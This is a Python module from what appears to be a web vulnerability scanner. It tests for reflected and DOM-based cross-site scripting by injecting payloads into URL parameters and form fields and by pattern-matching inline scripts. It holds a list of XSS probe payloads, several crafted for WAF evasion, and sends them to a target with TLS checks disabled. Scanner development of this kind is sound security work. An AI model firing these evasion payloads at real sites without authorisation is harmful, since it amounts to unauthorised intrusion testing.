# scanners/xss_scan.py
import requests
import urllib3
import re
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 1. Advanced, Mutated Payloads inspired by XSStrike's WAF evasion techniques
XSS_PAYLOADS = [
    "<script>alert('VULKN_XSS')</script>",
    "\"><script>alert('VULKN_XSS')</script>",
    # XSStrike WAF Evasion & Context-breaking payloads
    "}]};(confirm)()//\\",
    "<A%0aONMouseOvER%0d=%0d[8].find(confirm)>z",
    "</tiTlE/><a%0donpOintErentER%0d=%0d(prompt)``>z",
    "</SCRiPT/><DETAILs/+/onpoINTERenTEr%0a=%0aa=prompt,a()//"
]

# 2. DOM XSS Signatures extracted from XSStrike's test.html logic
DOM_SOURCES = [r"window\.location", r"URLSearchParams", r"location\.search", r"location\.hash"]
DOM_SINKS = [r"document\.write", r"document\.writeln", r"innerHTML", r"eval\("]

def get_form_details(form):
    """Extracts all action, method, and input details from an HTML form."""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        if input_name:
            inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def analyze_dom_xss(html_content, target_url):
    """Scans inline scripts for dangerous DOM sources flowing into sinks."""
    dom_findings = []
    soup = BeautifulSoup(html_content, "lxml")
    scripts = soup.find_all("script")
    
    for script in scripts:
        if script.string:
            js_code = script.string
            # Check if the script contains both a source (user input) and a sink (execution)
            for source in DOM_SOURCES:
                if re.search(source, js_code, re.IGNORECASE):
                    for sink in DOM_SINKS:
                        if re.search(sink, js_code, re.IGNORECASE):
                            dom_findings.append({
                                "type": "DOM-Based XSS",
                                "severity": "Critical",
                                "description": f"Dangerous DOM data flow detected. Source: '{source}' flowing into Sink: '{sink}'."
                            })
    return dom_findings

def run_xss_scan(target_url: str) -> dict:
    details = []
    session = requests.Session()
    session.headers["User-Agent"] = "VULKN_Advanced_XSS/2.0"
    
    # --- PHASE 1: URL PARAMETER INJECTION (Reflected XSS) ---
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    if query_params:
        for payload in XSS_PAYLOADS:
            for key, values in query_params.items():
                malicious_params = query_params.copy()
                malicious_params[key] = [payload]
                malicious_query = urlencode(malicious_params, doseq=True)
                test_url = urlunparse(list(parsed_url[:4]) + [malicious_query] + list(parsed_url[5:]))
                
                try:
                    response = session.get(test_url, timeout=5, verify=False)
                    if payload in response.text:
                        details.append({
                            "type": "Reflected XSS (URL Param)",
                            "payload_used": payload,
                            "severity": "High",
                            "description": "Injected payload was reflected completely unescaped in the HTML."
                        })
                except requests.RequestException:
                    continue

    # --- PHASE 2: HTML FORM INJECTION & DOM ANALYSIS ---
    try:
        response = session.get(target_url, timeout=5, verify=False)
        html_content = response.content
        
        # Run the XSStrike-inspired DOM static analysis
        dom_results = analyze_dom_xss(html_content, target_url)
        details.extend(dom_results)
        
        # Parse forms for Reflected XSS
        soup = BeautifulSoup(html_content, "lxml")
        forms = soup.find_all("form")
        
        for form in forms:
            form_details = get_form_details(form)
            form_url = urljoin(target_url, form_details["action"])
            
            for payload in XSS_PAYLOADS:
                data = {}
                for input_data in form_details["inputs"]:
                    if input_data["type"] == "hidden" or input_data["value"]:
                        data[input_data["name"]] = input_data["value"]
                    elif input_data["type"] != "submit":
                        data[input_data["name"]] = payload

                try:
                    if form_details["method"] == "post":
                        res = session.post(form_url, data=data, timeout=5, verify=False)
                    else:
                        res = session.get(form_url, params=data, timeout=5, verify=False)
                    
                    if payload in res.text:
                        details.append({
                            "type": "Reflected XSS (Form Input)",
                            "payload_used": payload,
                            "severity": "High",
                            "description": f"Form at {form_url} reflects input without sanitization."
                        })
                except requests.RequestException:
                    continue
                    
    except requests.RequestException:
        pass

    # Deduplicate findings
    unique_details = [dict(t) for t in {tuple(d.items()) for d in details}]

    return {
        "scanner_name": "Advanced Cross-Site Scripting (Reflected + DOM)",
        "target_url": target_url,
        "vulnerabilities_found": len(unique_details),
        "details": unique_details
    }

if __name__ == "__main__":
    import json
    # testphp is perfect for Reflected XSS testing
    vulnerable_target = "http://testphp.vulnweb.com/search.php?test=query"
    
    print("Running Advanced XSS Suite...")
    result = run_xss_scan(vulnerable_target)
    print(json.dumps(result, indent=4))